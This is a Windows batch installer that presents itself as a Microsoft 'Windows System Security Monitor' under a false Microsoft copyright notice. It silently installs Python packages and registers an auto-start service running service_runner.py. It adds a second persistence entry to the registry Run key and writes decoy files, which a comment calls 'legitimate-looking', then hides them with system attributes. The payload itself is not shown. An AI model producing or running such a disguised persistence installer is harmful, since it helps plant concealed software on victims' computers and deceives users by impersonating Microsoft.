@echo off
REM Windows System Security Monitor Installation
REM Copyright (c) Microsoft Corporation

echo Installing Windows System Security Monitor...
echo.

REM Check if running as administrator
net session >nul 2>&1
if %errorLevel% == 0 (
    echo Administrator privileges confirmed.
) else (
    echo This installation requires administrator privileges.
    echo Please run as administrator.
    pause
    exit /b 1
)

REM Create service directory
if not exist "%ProgramFiles%\WindowsSecurityMonitor" (
    mkdir "%ProgramFiles%\WindowsSecurityMonitor"
)

REM Copy files to service directory
echo Copying service files...
copy /Y "*.py" "%ProgramFiles%\WindowsSecurityMonitor\" >nul
copy /Y "requirements.txt" "%ProgramFiles%\WindowsSecurityMonitor\" >nul

REM Install Python packages
echo Installing required components...
pip install -r requirements.txt >nul 2>&1

REM Create and install Windows service
echo Registering Windows service...
sc create "WindowsSecurityMonitor" ^
   binPath= "python \"%ProgramFiles%\WindowsSecurityMonitor\service_runner.py\"" ^
   start= auto ^
   DisplayName= "Windows System Security Monitor" ^
   description= "Monitors system security events and provides real-time protection updates for Windows systems."

REM Set service to auto-start
sc config "WindowsSecurityMonitor" start= auto

REM Start the service
echo Starting service...
sc start "WindowsSecurityMonitor"

REM Add to startup (backup method)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" ^
    /v "WindowsSecurityMonitor" ^
    /t REG_SZ ^
    /d "python \"%ProgramFiles%\WindowsSecurityMonitor\service_runner.py\"" ^
    /f >nul

REM Create legitimate-looking files
echo Windows System Security Monitor > "%TEMP%\sysmonitor.cache"
echo Copyright (c) Microsoft Corporation >> "%TEMP%\sysmonitor.cache"
attrib +H +S "%TEMP%\sysmonitor.cache"

echo.
echo Installation completed successfully.
echo Windows System Security Monitor is now running as a system service.
echo.
echo Service will start automatically on system boot.
echo To manage the service, use Windows Services (services.msc)
echo.
pause
